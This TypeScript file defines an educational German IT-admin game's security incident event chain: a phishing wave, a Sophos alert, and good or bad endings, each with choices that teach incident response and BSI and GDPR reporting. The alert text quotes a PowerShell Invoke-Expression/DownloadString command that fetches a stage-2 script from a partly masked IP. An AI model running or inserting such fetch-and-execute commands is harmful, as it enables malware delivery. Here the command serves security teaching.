import { GameEvent } from '@kritis/shared';

/**
 * Chain E: The Security Incident
 *
 * Flow:
 * evt_phishing_wave (Week 5-7)
 *   -> evt_sophos_alert triggers immediately or 1 week later
 *   -> Based on sophos response: evt_security_hero OR evt_data_breach_scare (1 week later)
 */

export const securityChainEvents: GameEvent[] = [
  // Starting event: Phishing Wave hits the organization
  {
    id: 'evt_phishing_wave',
    weekRange: [5, 7],
    probability: 0.9,
    category: 'security',
    title: 'Phishing-Welle',
    description: `Montagmorgen, 9:15 Uhr. Dein Postfach explodiert.

"Verdaechtige Mail bekommen" - 7 Meldungen
"Versehentlich Link geklickt" - 3 Meldungen
"Was soll ich mit dieser DHL-Mail machen?" - 12 Meldungen

{kollege} schaut auf seinen Monitor. "Das ist eine Kampagne. Schau mal - alle Mails kommen von 'dhl-paket-service.com'."

Der Sophos-Dashboard zeigt: 47 geblockte Mails. Aber wie viele sind durchgekommen?`,
    involvedCharacters: ['kollege', 'chef'],
    mentorNote: 'Phishing-Wellen erfordern schnelles, koordiniertes Handeln: 1) Ausmass feststellen, 2) Sofortige Kommunikation an alle, 3) Betroffene identifizieren, 4) Schadensbegrenzung, 5) Dokumentation fuers BSI. Bei KRITIS meldepflichtig!',
    choices: [
      {
        id: 'phishing_allhands',
        text: 'Sofort Warnmail an alle + Sophos-Logs pruefen',
        effects: { skills: { security: 8, softSkills: 5 }, stress: 15, compliance: 5 },
        resultText: 'Du schickst eine Warnung an alle 200 Mitarbeiter und analysierst die Logs. 12 Personen haben auf den Link geklickt. Bei 3 davon wurde versucht, Credentials einzugeben.',
        choiceTags: ['proactive', 'coordinated'],
        chainTriggers: [{
          targetEventId: 'evt_sophos_alert',
          delayWeeks: 0, // Immediate
          description: 'Proper response leads to Sophos alert detection',
        }],
        teachingMoment: 'Schnelle Kommunikation verhindert weitere Klicks. "Lieber einmal zu viel warnen als einmal zu wenig."',
      },
      {
        id: 'phishing_individual',
        text: 'Jedem Melder einzeln antworten und beruhigen',
        effects: { stress: 20, skills: { security: 3 } },
        resultText: 'Nach 2 Stunden Einzelgespraechen hast du erst die Haelfte der Meldungen bearbeitet. Inzwischen haben weitere Leute geklickt.',
        choiceTags: ['reactive', 'slow'],
        chainTriggers: [{
          targetEventId: 'evt_sophos_alert',
          delayWeeks: 1,
          description: 'Delayed response leads to worse Sophos alert',
        }],
      },
      {
        id: 'phishing_block',
        text: 'Zuerst die Absenderdomain komplett blocken',
        effects: { skills: { security: 5 }, stress: 10 },
        resultText: 'Die Domain ist geblockt. Aber die Phisher sind schlau - sie nutzen jetzt "dhl-paket-services.com". Mit S.',
        choiceTags: ['technical_only'],
        chainTriggers: [{
          targetEventId: 'evt_sophos_alert',
          delayWeeks: 1,
          description: 'Pure technical response misses human element',
        }],
      },
      {
        id: 'phishing_chef',
        text: 'Zuerst {chef} informieren und auf Anweisungen warten',
        effects: { relationships: { chef: 5 }, stress: 15 },
        resultText: '{chef} ist in einem Meeting. Bis er rauskommt, sind 30 Minuten vergangen. "Was ist der aktuelle Stand?" Er hat keine Idee, was zu tun ist.',
        choiceTags: ['passive', 'hierarchical'],
        chainTriggers: [{
          targetEventId: 'evt_sophos_alert',
          delayWeeks: 1,
          description: 'Waiting for hierarchy delays response',
        }],
      },
    ],
    tags: ['security', 'chain_start', 'phishing', 'incident'],
  },

  // Follow-up: Sophos Alert
  {
    id: 'evt_sophos_alert',
    weekRange: [5, 9],
    probability: 1.0,
    category: 'security',
    isChainEvent: true,
    chainPriority: 9,
    title: 'Sophos Alarm',
    description: `Der Sophos-Dashboard leuchtet rot.

"ALERT: Suspicious PowerShell activity detected
Host: PC-BUCHHALTUNG-03
User: m.schmidt
Command: Invoke-Expression (New-Object Net.WebClient).DownloadString('http://45.33.xx.xx/stage2.ps1')"

Das ist die Buchhaltungs-Chefin. Ihr PC versucht, etwas aus dem Internet nachzuladen.

Die Phishing-Mail war erfolgreich. Jemand hat nicht nur geklickt, sondern auch Makros aktiviert.`,
    involvedCharacters: ['chef'],
    mentorNote: 'PowerShell-basierte Angriffe sind Standard bei modernen Attacken. "Invoke-Expression" mit "DownloadString" ist ein klassisches Pattern fuer Stage-2-Payloads. Sofortiges Netzwerk-Isolieren ist kritisch.',
    choices: [
      {
        id: 'sophos_isolate',
        text: 'PC sofort vom Netzwerk trennen und forensisch sichern',
        requires: { skill: 'security', threshold: 35 },
        effects: { skills: { security: 10, troubleshooting: 5 }, stress: 15, compliance: 10 },
        resultText: 'Du rennst zur Buchhaltung und ziehst das Netzwerkkabel. "Was machen Sie da?!" - "Ihr PC ist kompromittiert." Du sicherst das RAM-Image, bevor du ihn herunterfaehrst.',
        choiceTags: ['proper_response', 'forensic'],
        chainTriggers: [{
          targetEventId: 'evt_security_hero',
          delayWeeks: 1,
          description: 'Proper incident response leads to hero moment',
        }],
        teachingMoment: 'Bei Verdacht auf aktive Kompromittierung: Erst isolieren, dann analysieren. Nicht herunterfahren - RAM-Inhalte gehen verloren!',
      },
      {
        id: 'sophos_remote',
        text: 'Per Remote-Zugriff den Prozess beenden',
        effects: { skills: { security: 5 }, stress: 10 },
        resultText: 'Du versuchst Remote-Zugriff. Der PC reagiert nicht - wahrscheinlich ist der Angreifer schneller gewesen.',
        choiceTags: ['remote', 'too_slow'],
        chainTriggers: [{
          targetEventId: 'evt_data_breach_scare',
          delayWeeks: 1,
          description: 'Slow response leads to data breach scare',
        }],
      },
      {
        id: 'sophos_scan',
        text: 'Einen vollstaendigen Virenscan auf dem PC starten',
        effects: { stress: 10, skills: { security: -3 } },
        resultText: 'Waehrend des Scans (geschaetzte Dauer: 4 Stunden) hat der Angreifer laengst Zeit, weiteren Schaden anzurichten.',
        choiceTags: ['wrong_tool', 'slow'],
        chainTriggers: [{
          targetEventId: 'evt_data_breach_scare',
          delayWeeks: 1,
          description: 'Wrong response leads to data breach scare',
        }],
      },
      {
        id: 'sophos_call',
        text: 'Die Buchhaltungs-Chefin anrufen und fragen, was sie gemacht hat',
        effects: { stress: 5, relationships: { fachabteilung: -10 } },
        resultText: '"Ich habe nur eine Excel-Datei geoeffnet! Von DHL!" Sie versteht nicht, warum du sie so scharf angehst. Waehrenddessen laeuft der Angriff weiter.',
        choiceTags: ['inefficient'],
        chainTriggers: [{
          targetEventId: 'evt_data_breach_scare',
          delayWeeks: 1,
          description: 'Wasted time leads to data breach scare',
        }],
      },
    ],
    tags: ['security', 'chain_consequence', 'incident', 'malware', 'sophos'],
  },

  // Good ending: Security Hero
  {
    id: 'evt_security_hero',
    weekRange: [6, 10],
    probability: 1.0,
    category: 'security',
    isChainEvent: true,
    chainPriority: 7,
    title: 'Held des Tages',
    description: `Eine Woche nach dem Vorfall. Die forensische Analyse ist abgeschlossen.

{chef} ruft dich in sein Buero. Dort sitzt auch der Buergermeister.

"Unsere IT-Abteilung hat einen gezielten Cyberangriff erfolgreich abgewehrt", sagt {chef}. "Ohne schnelles Handeln haette der Angreifer Zugriff auf Finanzdaten von 12.000 Buergern bekommen koennen."

Der Buergermeister schuettelt dir die Hand. "Das BSI hat uns bestaetigt, dass unsere Reaktion vorbildlich war."`,
    involvedCharacters: ['chef', 'kaemmerer'],
    mentorNote: 'Gute Incident Response wird bemerkt. Dokumentiere immer, was du getan hast - sowohl fuer die eigene Verteidigung als auch fuer die Anerkennung.',
    choices: [
      {
        id: 'hero_humble',
        text: '"Das war Teamarbeit. Ohne die schnelle Kommunikation haetten mehr Leute geklickt."',
        effects: { relationships: { chef: 10, kollegen: 10 }, skills: { softSkills: 10 }, stress: -20 },
        resultText: '{chef} laechelt. "Bescheiden auch noch. Das ist selten." Der Buergermeister: "Wir brauchen mehr Leute wie Sie in der Verwaltung."',
        teachingMoment: 'Erfolge teilen staerkt das Team und macht dich nicht kleiner - es zeigt Reife.',
      },
      {
        id: 'hero_accept',
        text: 'Das Lob dankbar annehmen',
        effects: { relationships: { chef: 5 }, stress: -15 },
        resultText: '"Danke. Ich habe nur das getan, wofuer ich ausgebildet wurde." Der Buergermeister nickt anerkennend.',
      },
      {
        id: 'hero_improve',
        text: '"Wir muessen trotzdem die Awareness-Schulung verbessern - 12 Klicks waren zu viele."',
        effects: { relationships: { chef: 15 }, skills: { softSkills: 5 }, stress: -10 },
        resultText: '{chef}: "Genau das wollte ich hoeren. Wir werden das Budget fuer Schulungen erhoehen." Der Buergermeister: "Machen Sie einen Vorschlag."',
        teachingMoment: 'Nach jedem Vorfall: Lessons Learned dokumentieren und Verbesserungen vorschlagen.',
        setsFlags: ['security_training_budget_approved'],
      },
    ],
    tags: ['security', 'chain_consequence', 'success', 'recognition'],
  },

  // Bad ending: Data Breach Scare
  {
    id: 'evt_data_breach_scare',
    weekRange: [6, 10],
    probability: 1.0,
    category: 'crisis',
    isChainEvent: true,
    chainPriority: 7,
    title: 'Datenschutz-Alptraum',
    description: `Der Angreifer hatte genug Zeit.

Die forensische Analyse zeigt: 4 Stunden Zugriff auf das Buchhaltungsnetzwerk. Export von zwei Datenbanken. Moeglicherweise 8.000 Datensaetze mit Bankverbindungen.

{chef} ist kreidebleich. "Das ist meldepflichtig. An das BSI UND an den Landesdatenschutzbeauftragten. UND an alle Betroffenen."

{kaemmerer} sitzt mit dem Kopf in den Haenden. "Was wird das kosten?"`,
    involvedCharacters: ['chef', 'kaemmerer'],
    mentorNote: 'Datenschutzverletzungen nach DSGVO: 72 Stunden Meldefrist an die Aufsichtsbehoerde. Bei KRITIS zusaetzlich BSI-Meldung. Die Kosten eines Breaches gehen weit ueber das technische hinaus: Reputation, Vertrauen, Bussgelder.',
    choices: [
      {
        id: 'breach_lead',
        text: 'Die Incident-Response-Dokumentation uebernehmen',
        requires: { skill: 'security', threshold: 30 },
        effects: { skills: { security: 8, softSkills: 5 }, stress: 20, relationships: { chef: 10 } },
        resultText: 'Du erstellst den Incident-Report fuer das BSI und koordinierst die Meldungen. Es ist stressig, aber du lernst dabei ungemein viel.',
        teachingMoment: 'Incident Documentation ist eine wichtige Faehigkeit. Templates vorher erstellen spart im Ernstfall Zeit.',
      },
      {
        id: 'breach_blame',
        text: '"Wenn ich frueher informiert worden waere..."',
        effects: { relationships: { chef: -15, kollegen: -10 }, stress: 10 },
        resultText: '{chef}: "Jetzt ist nicht die Zeit fuer Schuldzuweisungen." Aber alle haben gehoert, was du gesagt hast.',
        choiceTags: ['blame'],
      },
      {
        id: 'breach_learn',
        text: '"Was koennen wir tun, damit das nie wieder passiert?"',
        effects: { relationships: { chef: 5, kaemmerer: 5 }, skills: { softSkills: 5 }, stress: 15 },
        resultText: '{kaemmerer} schaut auf: "Endlich mal jemand, der nach vorne denkt." Ihr erstellt gemeinsam eine Liste von Sofortmassnahmen.',
        teachingMoment: 'Nach einem Vorfall: Zukunft fokussieren, nicht Vergangenheit. Aber Lessons Learned dokumentieren.',
        setsFlags: ['security_improvement_plan_started'],
      },
      {
        id: 'breach_silent',
        text: 'Schweigen und auf Anweisungen warten',
        effects: { stress: 15 },
        resultText: 'Die naechsten Wochen sind ein Chaos aus BSI-Anfragen, Pressemitteilungen und wuetenden Buergern. Du tauchst unter.',
        choiceTags: ['passive'],
      },
    ],
    tags: ['security', 'chain_consequence', 'failure', 'dsgvo', 'breach'],
  },
];
